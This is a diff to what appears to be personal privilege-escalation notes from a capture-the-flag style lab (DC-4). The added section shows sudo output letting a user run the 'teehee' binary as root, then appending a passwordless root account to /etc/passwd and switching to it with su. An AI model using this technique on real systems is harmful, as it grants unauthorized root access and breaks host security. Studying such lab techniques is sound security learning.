@@ -32,4 +32,21 @@ if you have read/write access to /etc/passwd you can:
     su myUser
     ```
          
-   
+## Case 2
+
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+
+In this case this binary can be used to append text to a file
+```
+a. So we used the binary to add a root user to the /etc/password file with no password
+        teehee -a /etc/passwd
+       anindya:0:0:root:/root:/bin/bash
+
+b. Then switch user to become root
+        su anindya
+```
